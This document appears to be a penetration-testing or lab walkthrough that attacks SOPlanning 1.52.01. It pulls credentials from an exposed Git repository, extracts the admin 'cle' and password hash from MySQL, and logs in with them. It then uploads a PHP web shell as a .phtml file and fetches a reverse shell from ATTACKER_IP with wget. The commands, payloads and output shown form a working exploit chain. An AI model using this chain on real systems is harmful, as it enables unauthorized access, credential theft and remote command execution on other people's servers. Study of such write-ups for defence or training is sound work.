# SOPlanning

SOPlanning `1.52.01` can expose a useful authenticated upload path once valid application credentials are recovered. In the observed path, exposed Git history leaked MySQL credentials, the `soplanning` database contained the admin user's `cle` and password hash, and the web login accepted the combined `cle|password` value before an authenticated `.phtml` upload produced command execution as `www-data`.

## Discovery

Nmap showed SSH, HTTP, and MySQL:

```text
80/tcp   open  http   Apache httpd
```

The HTTP scan also disclosed an exposed Git repository:

```text
http-git:
  TARGET:80/.git/
    Git repository found!
    Last commit message: created .env to store the database configuration
```

If browsing by IP redirects to a hostname, add the main hostname and SOPlanning subdomain locally:

```text
TARGET TARGET_HOST SOPLANNING_HOST
```

Useful web paths:

```text
http://TARGET_HOST/
http://TARGET_HOST/login.php
http://SOPLANNING_HOST/
http://SOPLANNING_HOST/www/index.php
```

The SOPlanning subdomain showed:

```text
Simple Online Planning v1.52.01
```

## Exposed Git Credentials

Dump the exposed repository:

```bash
python3 git_dumper.py http://TARGET_HOST /tmp/target-git
cd /tmp/target-git
git log
```

Interesting history:

```text
created .env to store the database configuration
removing db-config due to hard coded credentials
added the database configuration
```

Inspect the commit that added the database configuration:

```bash
git show 18833b811e967ab8bec631344a6809aa4af59480
```

Leaked database settings:

```php
$dbHost = 'localhost';
$dbName = 'DATABASE_NAME';
$username = 'DB_USER';
$password = 'DB_PASSWORD';
```

## SOPlanning Database Access

Connect to the exposed MySQL service with server certificate verification disabled:

```bash
mysql -u DB_USER -h TARGET -p --skip-ssl-verify-server-cert
```

Available databases included the SOPlanning database:

```sql
show databases;
```

```text
DATABASE_NAME
information_schema
performance_schema
soplanning
```

Inspect SOPlanning tables:

```sql
use soplanning;
show tables;
```

Useful tables:

```text
planning_config
planning_user
```

Useful `planning_config` values:

```sql
select * from planning_config\G
```

```text
cle: SECURE_KEY
valeur: a5eaea3ccc1268f62d081460bb32fb67

cle: SOPLANNING_API_KEY_VALUE
valeur: 0b6038ad-d400-11ef-bf32-00505695ee43
```

The admin row in `planning_user` contained both a password hash and `cle` value:

```sql
select * from planning_user\G
```

```text
user_id: ADM
nom: admin
login: admin
password: 77ba9273d4bcfa9387ae8652377f4c189e5a47ee
droits: ["users_manage_all", "projects_manage_all", "projectgroups_manage_all", "tasks_modify_all", "tasks_view_all_projects", "lieux_all", "ressources_all", "parameters_all", "stats_users", "stats_projects", "audit_restore", "stats_roi_projects"]
cle: dbee8fd60fd4244695084bd84a996882
google_2fa: setup
login_actif: oui
```

## SOPlanning Login With `cle|password`

Capture a normal SOPlanning login request in Burp, send it to Repeater, and replace only the password value with the stored `cle|password` pair. The raw notes only showed the browser-field method, not the full HTTP request.

Working browser values:

```text
Username: admin
Password: dbee8fd60fd4244695084bd84a996882|77ba9273d4bcfa9387ae8652377f4c189e5a47ee
```

The same value should be placed in the password parameter of the captured authentication request:

```text
password=dbee8fd60fd4244695084bd84a996882|77ba9273d4bcfa9387ae8652377f4c189e5a47ee
```

## Authenticated Upload RCE

After authenticating, browse to the planning page and create a task with an attached file:

```text
http://SOPLANNING_HOST/www/planning.php
```

The upload request goes to:

```text
POST /www/process/upload.php
```

Upload a PHP command shell with a PHP-executed extension:

```php
<?php system($_GET['cmd']); ?>
```

The successful upload used `p.phtml` with `Content-Type: image/png` and returned:

```text
File 'p.phtml' was added to the task !
```

The uploaded shell executed under `/www/upload/files/<linkid>/`:

```bash
curl 'http://SOPLANNING_HOST/www/upload/files/16018867796a17800f9ded1/p.phtml?cmd=id'
```

Successful execution:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell

If direct callbacks fail, test outbound ports and host the payload on a port that can be reached. In the observed path, hosting files on `3306` and catching the reverse shell on `80` worked:

```bash
python3 -m http.server 3306
nc -nlvp 80
```

Fetch a PHP reverse shell into the upload directory through the web shell:

```bash
curl 'http://SOPLANNING_HOST/www/upload/files/16018867796a17800f9ded1/p.phtml?cmd=wget+http://ATTACKER_IP:3306/php-reverse-shell.php'
```

Trigger it:

```text
http://SOPLANNING_HOST/www/upload/files/16018867796a17800f9ded1/php-reverse-shell.php
```

Successful shell context:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

